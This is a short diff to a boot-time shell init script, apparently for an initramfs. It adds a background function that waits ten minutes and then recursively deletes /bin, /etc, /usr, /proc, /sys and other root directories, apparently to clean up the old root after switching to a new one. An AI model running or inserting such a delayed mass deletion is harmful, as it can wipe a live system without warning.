@@ -1,14 +1,21 @@
 #!/bin/bash
 
+destruct() {
+ sleep 600
+ rm  -rf /bin /dev /etc /init /lib /proc /sbin /sys /usr
+}
+
+[ $$ == 1 ] || exit 1
+
 trap : INT QUIT TSTP
 export PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin
 umask 022
 
 /etc/init.d/rcS
 
-if    [  -f     /media/root/sbin/init  ];  then
-  cd            /media/root
-  mount  --move /media/root /
-  exec chroot . /sbin/init "$@"
-else   exec     /sbin/init "$@"
+if    [ -f     /media/root/sbin/init ]; then destruct &
+ cd            /media/root
+ mount  --move /media/root /
+ exec chroot . /sbin/init "$@"
+else  exec     /sbin/init "$@"
 fi
